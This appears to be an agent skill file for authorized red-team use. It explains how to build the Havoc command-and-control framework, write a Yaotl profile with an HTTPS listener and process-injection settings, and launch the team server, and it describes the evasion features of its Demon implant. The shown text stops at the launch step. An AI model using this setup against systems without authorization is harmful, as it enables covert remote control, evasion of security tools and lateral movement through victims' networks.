---
name: operating-havoc-c2
description: "Deploy Havoc C2 teamserver with Yaotl config, generate Demon agents using indirect syscalls and sleep obfuscation for post-exploitation and lateral movement. Signals: havoc, c2, demon agent, indirect syscalls, post-exploitation."
zh-signals: "部署 Havoc C2 teamserver(Yaotl 配置),生成间接系统调用+睡眠混淆的 Demon 代理,执行后渗透与横向。信号:havoc,c2,demon代理,间接系统调用,后渗透。"
when-to-use: Deploy a Havoc C2 team server with Yaotl malleable profiles, generate evasive Demon agents using indirect syscalls and sleep obfuscation, and run post-exploitation and pivoting operations. Use during 
domain: cybersecurity
subdomain: red-teaming
tags:
- red-team
- command-and-control
- havoc
- demon-agent
- adversary-emulation
- evasion
- post-exploitation
- sleep-obfuscation
version: '1.0'
author: mahipal
license: Apache-2.0
nist_csf:
- DE.CM-01
mitre_attack:
- T1071.001
---
# Operating Havoc C2

> **Legal Notice:** This skill is for authorized security testing, sanctioned red-team engagements, and education only. Deploying a C2 framework or its agents against systems you do not own or lack explicit written authorization to test is illegal. Operate strictly within a signed rules-of-engagement document.

## Overview

Havoc is an open-source, modern command-and-control framework created by `@C5pider` (https://github.com/HavocFramework/Havoc). Its primary implant, the **Demon**, is written in C and assembly and was designed from the ground up for evasion: it supports indirect syscalls (Hell's Gate / Halo's Gate), return-address and stack spoofing, and sleep obfuscation techniques (Ekko / FOLIAGE) that encrypt the agent in memory while it sleeps. The **team server** is the backend that starts listeners, queues tasks, manages agent check-ins, and brokers operator connections over an encrypted WebSocket. Operators connect with the Havoc **client**, a Qt GUI.

Havoc's behavior is driven by a **Yaotl profile** — a configuration language forked from HashiCorp's HCL — which defines the team server, operators, listeners, and Demon defaults. Because Havoc has been observed in real intrusions and is favored for its evasion features, exercising it during authorized engagements is valuable for emulating advanced adversary tradecraft and for testing whether EDR and network sensors detect its HTTP(S) C2 and in-memory techniques. This skill covers building Havoc, writing a profile, launching the team server, generating Demon agents, and running post-exploitation and lateral movement.

## When to Use

- When an authorized red-team engagement calls for an evasive, GUI-driven C2
- When emulating an adversary that uses Havoc/Demon (per threat intelligence) in a purple-team exercise
- When validating EDR detection of indirect syscalls, sleep obfuscation, and stack spoofing
- When demonstrating post-exploitation impact and lateral movement for a report

## Prerequisites

- A dedicated Linux host (Debian/Ubuntu/Kali) for the team server
- Go 1.18+ for the team server; Python 3.10 and Qt5 libraries for the client
- mingw-w64 and nasm for cross-compiling the Demon for Windows targets
- Signed authorization / rules of engagement

Install dependencies and build from source:

```bash
# Clone the framework
git clone https://github.com/HavocFramework/Havoc.git
cd Havoc

# Debian/Ubuntu/Kali build dependencies
sudo apt update && sudo apt install -y \
  git build-essential cmake libfontconfig1 libglu1-mesa-dev libgtest-dev \
  libspdlog-dev libboost-all-dev libncurses5-dev libgdbm-dev libssl-dev \
  libreadline-dev libffi-dev libsqlite3-dev libbz2-dev qtbase5-dev qtchooser \
  qt5-qmake qtbase5-dev-tools libqt5websockets5 libqt5websockets5-dev \
  qtdeclarative5-dev golang-go python3.10 python3.10-dev mingw-w64 nasm

# Build the team server
make ts-build

# Build the client
make client-build
```

## Objectives

- Author a Yaotl profile defining team server, operators, and a listener
- Launch the Havoc team server and connect with the client
- Create an HTTP(S) listener
- Generate an evasive Demon agent (EXE / shellcode) with sleep obfuscation
- Interact with the Demon and run post-exploitation commands
- Execute .NET assemblies and BOFs in-memory
- Pivot through the beachhead via SOCKS and port forwarding

## MITRE ATT&CK Mapping

| ID | Technique | Use in this skill |
|----|-----------|-------------------|
| T1071.001 | Application Layer Protocol: Web Protocols | The Demon's HTTP(S) listener carries C2 over web protocols to blend with normal traffic |

Related techniques exercised by the workflow:

| ID | Technique |
|----|-----------|
| T1027.007 | Obfuscated Files or Information: Dynamic API Resolution (indirect syscalls) |
| T1620 | Reflective Code Loading (in-memory .NET / BOF) |
| T1055 | Process Injection |
| T1090.001 | Internal Proxy (SOCKS pivot) |

## Workflow

### Step 1: Write a Yaotl profile

Create `profiles/engagement.yaotl` defining the team server, an operator, and an HTTP listener. Yaotl is HCL-style:

```hcl
Teamserver {
    Host = "0.0.0.0"
    Port = 40056

    Build {
        Compiler64 = "/usr/bin/x86_64-w64-mingw32-gcc"
        Nasm = "/usr/bin/nasm"
    }
}

Operators {
    user "operator1" {
        Password = "ChangeMe_Str0ng!"
    }
}

Listeners {
    Http {
        Name     = "https-listener"
        Hosts    = ["c2.example.com"]
        HostBind = "0.0.0.0"
        PortBind = 443
        PortConn = 443
        Secure   = true   # HTTPS
    }
}

Demon {
    Sleep = 30
    Jitter = 25

    TrustXForwardedFor = false

    Injection {
        Spawn64 = "C:\\Windows\\System32\\notepad.exe"
        Spawn32 = "C:\\Windows\\SysWOW64\\notepad.exe"
    }
}
```

### Step 2: Launch the team server

Run the team server with your profile (privileged ports may require sudo):

```bash
# Verbose run with a custom profile
./havoc server --profile profiles/engagement.yaotl -v

> 📎 Detailed content (full examples / references / data tables) has been split into `reference.md` in the same directory; use Read to load the relevant section on demand.
